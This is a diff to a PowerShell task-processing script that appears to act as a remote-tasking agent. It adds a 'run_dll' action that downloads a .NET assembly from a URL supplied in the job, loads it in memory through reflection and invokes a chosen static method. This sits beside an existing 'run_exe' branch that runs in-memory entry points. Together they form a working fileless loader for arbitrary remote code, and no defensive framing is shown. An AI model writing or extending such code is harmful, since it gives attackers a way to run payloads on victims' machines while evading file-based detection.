@@ -31,7 +31,7 @@ try {
 }
 
 # Process tasks
-$allowed = @('print', 'list_dir', 'fetch_info', 'run_exe')
+$allowed = @('print', 'list_dir', 'fetch_info', 'run_exe', 'run_dll')
 foreach ($t in $job.tasks) {
     $act = ("" + $t.action).ToLower()
     if ($allowed -notcontains $act) {
@@ -82,13 +82,40 @@ foreach ($t in $job.tasks) {
                 $entryPoint = $assembly.EntryPoint
                 if ($entryPoint) {
                     Write-Host "RUN_EXE: Invoking entry point..." -ForegroundColor Cyan
-                    $entryPoint.Invoke($null, @($null))  # For parameterless Main
+                    $entryPoint.Invoke($null, @($null))
                     Write-Host "RUN_EXE: Execution complete." -ForegroundColor Green
                 } else {
                     Write-Host "RUN_EXE error: No entry point found." -ForegroundColor Red
                 }
             } catch {
                 Write-Host "RUN_EXE error: $($_.Exception.Message)" -ForegroundColor Red
+            }
+        }
+        'run_dll' {
+            $url = $t.url -as [string]
+            $className = $t.class -as [string]
+            $methodName = $t.method -as [string]
+            try {
+                $wc = New-Object System.Net.WebClient
+                $bytes = $wc.DownloadData($url)
+                $len = $bytes.Length
+                Write-Host "RUN_DLL: Downloaded $len bytes from $url" -ForegroundColor Yellow
+                $assembly = [Reflection.Assembly]::Load($bytes)
+                $type = $assembly.GetType($className)
+                if ($type) {
+                    $method = $type.GetMethod($methodName, [Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static)
+                    if ($method) {
+                        Write-Host "RUN_DLL: Invoking $className.$methodName..." -ForegroundColor Cyan
+                        $method.Invoke($null, $null)
+                        Write-Host "RUN_DLL: Execution complete." -ForegroundColor Green
+                    } else {
+                        Write-Host "RUN_DLL error: Method $methodName not found." -ForegroundColor Red
+                    }
+                } else {
+                    Write-Host "RUN_DLL error: Class $className not found." -ForegroundColor Red
+                }
+            } catch {
+                Write-Host "RUN_DLL error: $($_.Exception.Message)" -ForegroundColor Red
             }
         }
     }
